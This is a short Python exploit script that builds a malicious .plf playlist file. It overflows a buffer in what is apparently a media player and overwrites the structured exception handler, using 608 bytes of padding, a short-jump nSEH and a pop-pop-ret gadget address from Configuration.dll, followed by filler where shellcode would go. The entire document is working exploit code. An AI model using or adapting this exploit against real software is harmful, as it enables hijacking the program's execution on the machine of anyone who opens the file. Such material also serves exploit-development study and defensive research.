#!/usr/bin/env python
import struct

filename="nseh.plf"

#----------------------------------------------------------------
# nSEH: \xEB\x06\x90\x90: JMP SHORT 0012F254
# SEH:  0x60346758 : pop ebx # pop esi # ret  | Configuration.dll
#----------------------------------------------------------------

nseh = "\xEB\x06\x90\x90"
seh  = struct.pack("<I", 0x60346758)
buffer = "A"*608 + nseh + seh + "B"*1384
textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()